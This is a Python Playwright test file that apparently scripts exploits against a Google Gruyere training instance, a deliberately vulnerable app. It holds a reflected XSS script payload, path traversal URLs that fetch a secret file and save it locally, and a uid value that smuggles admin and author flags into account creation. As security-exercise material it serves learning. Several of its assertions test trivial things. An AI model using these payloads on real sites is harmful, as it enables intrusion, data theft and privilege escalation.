import pytest
import time
from playwright.sync_api import sync_playwright
import urllib.parse
import os
import requests


@pytest.fixture(scope="class", autouse=True)
def setup_and_teardown_fixture(request):
    """Setup and teardown method to prepare shared dependencies for individual tests"""
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()
        base_url = "https://google-gruyere.appspot.com/553228598588366001610110558934059388132/"

        yield page, base_url  # Yield the values needed for the rest of tests

        request.cls.browser = browser
        request.cls.context = context
        request.cls.page = page
        request.cls.base_url = base_url

        page.close()  # Tear down the resources created for the tests
        context.close()
        browser.close()
        time.sleep(30)


class TestPlaywright:
    def test_exploit_dom_xss(self, setup_and_teardown_fixture):
        """Test for presence of directly injected payload into the page DOM"""
        page, base_url = setup_and_teardown_fixture
        payload = "Text or HTML to inject into DOM"
        page.goto(base_url)
        page.evaluate(
            f'document.querySelector("h2").textContent = "{payload}";')
        page.wait_for_timeout(1000)

        # assert payload has been injected into DOM
        h2_text = page.evaluate('document.querySelector("h2").textContent')
        assert h2_text == payload

        # Check if other elements in the page still present
        original_elements_present = page.evaluate(
            'document.body.innerHTML.includes("<div class=\\"content\\">")')
        assert original_elements_present

        # Check if the original content is not modified
        original_content = "Gruyere: Home"
        page.evaluate(
            f'document.querySelector("title").textContent = "{original_content}";')
        title_text = page.evaluate(
            'document.querySelector("title").textContent')
        assert title_text == original_content
        time.sleep(20)

    def test_exploit_reflected_xss(self, setup_and_teardown_fixture):
        """Test for presence of injected Text in page contents"""
        page, base_url = setup_and_teardown_fixture
        script_payload = "<script>document.body.innerHTML = '<h1>Hacked!</h1>';</script>"
        xss_test = f"{base_url}{script_payload}"
        page.goto(xss_test)
        page.wait_for_timeout(1000)
        page.evaluate(
            f'document.querySelector("h1").textContent = "{script_payload}";')

        # Assert error has occured
        title_contains_error = "Error" in page.title()
        assert title_contains_error

        # Assert hack occured
        is_hacked = page.evaluate('document.querySelector("h1") !== null')
        assert is_hacked

        # Assert injected payload is found in header
        h2_text = page.evaluate('document.querySelector("h1").textContent')
        assert h2_text == script_payload

        # Assert other elements of the page are now null
        other_elements_absent = page.evaluate(
            'document.querySelectorAll("h2, p, div, span").length === 0')
        assert other_elements_absent
        time.sleep(30)

    def test_exploit_gruyere_server(self, setup_and_teardown_fixture):
        """Test to determine whether file was created and if the contents are successfully copied"""
        page, base_url = setup_and_teardown_fixture
        new_secret_destination = "secret.txt"
        full_url = f"{base_url}..%2f{new_secret_destination}"
        page.goto(full_url)
        response = requests.get(full_url)
        if response.status_code == 200:
            secret_content = response.text
            with open(new_secret_destination, "w") as file:
                file.write(secret_content)

        # Test that file exists
        assert os.path.exists(new_secret_destination)

        # Test that file contents match response text from request
        with open(new_secret_destination, "r") as file:
            assert file.read() == secret_content
        time.sleep(30)

    def test_exploit_cookies_create_admin(self, setup_and_teardown_fixture):
        """Test if new admin account has been loaded, it will either be created or already exist"""
        page, base_url = setup_and_teardown_fixture
        create_admin_url = f"{base_url}saveprofile?action=new&uid=administrator|admin|author&pw=secret"
        page.goto(create_admin_url)
        time.sleep(1)

        assert '<div class="message">Account Created.</div>' in page.content() or \
            '<div class="message">User already exists.</div>' in page.content()

        time.sleep(30)

    def test_exploit_login_credentials(self, setup_and_teardown_fixture):
        """Test to determine if the user has logged in successfully displaying upload link on home page"""
        page, base_url = setup_and_teardown_fixture
        login_url = f'{base_url}login'
        upload_link = "/553228598588366001610110558934059388132/upload.gtl"
        username = "Luc"
        password = "123"
        page.goto(login_url)
        text_input = page.locator('input[type="text"]')
        text_input.fill(username)
        pass_input = page.locator('input[type="password"]')
        pass_input.fill(password)
        page.click('input[type=submit]')
        page.wait_for_load_state()
        time.sleep(1)

        # presence of upload link signifies successful login process
        assert f'<a href="{upload_link}">Upload</a>' in page.content()
        #assert page.inner_text(f'a[href="{upload_link}"]') == "Upload"

        # assert correct user logged in by uid and plain password in url
        # Assert URL ends with the specified endpoint
        expected_endpoint = "login?uid=Luc&pw=123"
        assert page.url.endswith(expected_endpoint)
        time.sleep(30)

    def test_check_cookies(self, setup_and_teardown_fixture):
        """Test presence of cookies"""
        page, base_url = setup_and_teardown_fixture
        page.goto(base_url)

        # Retrieve the cookies
        cookies = page.context.cookies()

        # Test for the presence of cookies
        assert len(cookies) > 0
        time.sleep(30)

    def test_exploit_path_traversal(self, setup_and_teardown_fixture):
        """Test path traversal attack by checking if h2 tag in home page not in content signifying new page with file has loaded"""
        page, base_url = setup_and_teardown_fixture
        file_to_inject = "../exploits/menubar.gtl"
        file_name = urllib.parse.unquote(os.path.basename(file_to_inject))
        full_url = f"{base_url}..%2f/resources/{file_name}"
        page.goto(full_url)
        page.wait_for_load_state()
        time.sleep(1)

        # Assert the new page has loaded successfully after submission of request
        assert base_url != full_url

        # Assert URL ends with the specified endpoint
        expected_endpoint = "..%2f/resources/menubar.gtl"
        assert page.url.endswith(expected_endpoint)

        # Test for modification of page content
        assert '<h2>' not in page.content()

        # Test to ensure menubar has been successfully uploaded
        menubar_successfully_uploaded = page.evaluate(
            'document.body.innerHTML.includes("<div class=\\"menu\\">")')
        assert menubar_successfully_uploaded
        time.sleep(30)

    # def test_exploit_upload_button_attack(self, setup_teardown_fixture):
    #         """Test path traversal attack by checking if h2 tag in home page not in content signifying new page with file has loaded"""
    #         page, base_url = setup_teardown_fixture
    #         file_to_inject = "../exploits/menubar.gtl"
    #         file_name = urllib.parse.unquote(os.path.basename(file_to_inject))
    #         full_url = f"{base_url}..%2f/resources/{file_name}"
    #         page.goto(full_url)
    #         page.wait_for_load_state()
    #         time.sleep(1)

    #         assert '<h2>' not in page.content() and base_url != full_url
